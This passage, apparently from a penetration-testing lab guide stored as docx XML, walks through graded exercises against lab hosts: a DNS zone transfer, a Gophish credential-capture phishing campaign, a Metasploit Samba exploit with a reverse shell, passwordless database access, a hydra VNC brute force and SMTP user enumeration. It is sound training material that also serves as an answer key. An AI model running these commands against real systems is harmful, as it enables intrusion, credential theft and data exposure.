          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>DMZ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Profile the network from the outside and find a DNS server that allows a full zone transfer (AXFR).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>nmap -p53 --open 172.28.10.0/24            # DNS host = 172.28.10.34 (dns-01)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>dig axfr pentesttv.local @172.28.10.34</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The AXFR dumps the entire zone: every host A record plus a TXT record named "flag".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The flag is the value of that TXT record.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">Flag: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>a PENTESTTV{32-hex} value, random per deploy. Validated by the scoreboard; the live value is recorded in flags.generated.env.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2. Delivery and Phishing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Grading: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>manual</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>DMZ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Build a phishing campaign in Gophish, send it into the MailHog sink, and capture a credential from the landing page.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Target link: http://localhost:3333</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># on the Docker host (PowerShell), get the Gophish admin password:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>docker logs pentesttv-gophish | findstr -i password</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># then in the browser:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>#   login http://localhost:3333</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>#   Sending Profile -&gt; SMTP host mailhog:1025, no auth</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>#   Landing Page -&gt; enable Capture Submitted Data + Capture Passwords</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>#   build + launch campaign; view mail at http://localhost:8025; landing at http://localhost:8088</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The email lands in MailHog; clicking through to the landing page and submitting test creds records a capture in the Gophish campaign results.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Nothing leaves the lab. Mark done.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3. Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>9</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MODULE_07_LAB_FLAG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>DMZ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Exploit the perimeter Linux host’s old Samba (usermap_script) to land a root shell and read the flag.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>nmap -sV 172.28.10.20                      # note Samba 139/445, vsftpd 21</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>msfconsole -q</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>use exploit/multi/samba/usermap_script</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>set RHOSTS 172.28.10.20</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>set LHOST 172.28.10.10                     # your Kali DMZ address</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>set payload cmd/unix/reverse</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>run</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cat /root/ctf/lab_flag.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>usermap_script gives an immediate root shell on the target.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>lab_flag.txt holds the graded flag.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Alternate path: the vsftpd 2.3.4 backdoor on port 21 also yields a shell and drops /root/ctf/walkthrough_flag.txt.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">Flag: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>a PENTESTTV{32-hex} value, random per deploy. Validated by the scoreboard; the live value is recorded in flags.generated.env.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4. Database Exploitation (MySQL)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>9</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MODULE_07C_MYSQL_FLAG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>DMZ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Connect to the DMZ MySQL as root with no password and read the corp secrets table.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>nmap -p3306 --open 172.28.10.0/24          # db-01 = 172.28.10.40</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>mysql -h 172.28.10.40 -u root --skip-ssl   # --skip-ssl: server offers a self-signed cert</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>USE corp;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>SELECT * FROM secrets;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>root connects with an empty password from anywhere.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The exfil_flag row holds the flag.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">Flag: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>a PENTESTTV{32-hex} value, random per deploy. Validated by the scoreboard; the live value is recorded in flags.generated.env. (seeded at container init; rotate with down -v then up).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5. Database Exploitation (PostgreSQL)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>9</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MODULE_07D_PG_FLAG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>DMZ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Connect to the DMZ PostgreSQL with trust auth (no password) and read the secrets table.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>nmap -p5432 --open 172.28.10.0/24          # db-02 = 172.28.10.41</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>psql -h 172.28.10.41 -U postgres -d corp</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>SELECT * FROM secrets;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>No password is required (trust authentication).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The exfil_flag row holds the flag.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">Flag: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>a PENTESTTV{32-hex} value, random per deploy. Validated by the scoreboard; the live value is recorded in flags.generated.env.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6. Remote Desktop (VNC)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>9</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MODULE_07E_VNC_FLAG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>DMZ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Brute force the VNC password from Kali, then view the desktop from your own OS and read the flag.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>nmap -p5900 --open 172.28.10.0/24          # vnc-01 = 172.28.10.42, host port 5901</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>hydra -P /usr/share/wordlists/lab-passwords.txt vnc://172.28.10.42</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># viewing is a GUI step: use TigerVNC/RealVNC on your own machine -&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>#   host localhost:5901, password: password</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>hydra recovers the VNC password: password.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The desktop shows the flag; it is also saved at /root/flag.txt on vnc-01.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The browser Kali is terminal only, so the viewer must run on your own computer.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">Flag: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>a PENTESTTV{32-hex} value, random per deploy. Validated by the scoreboard; the live value is recorded in flags.generated.env. (seeded at container init; rotate with down -v then up).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7. Mail Server Enumeration (SMTP)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>9</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MODULE_07F_SMTP_FLAG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>DMZ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Grab the SMTP banner (it leaks a maintenance note) and enumerate users with VRFY.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>nmap -sV -p25 172.28.10.43</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>nc 172.28.10.43 25                         # read the 220 banner line</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>VRFY jsmith                                # 250/252 = exists; try ahill, mkhan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>VRFY nosuchuser                            # rejected</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The 220 banner’s maint-note value is the flag.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>VRFY confirms jsmith, ahill, mkhan exist (another source for the SSH username).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The server also relays for any network (open relay) if you want to demonstrate it.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">Flag: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>a PENTESTTV{32-hex} value, random per deploy. Validated by the scoreboard; the live value is recorded in flags.generated.env.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8. Web Application (DVWA)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>14</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Grading: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>manual</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
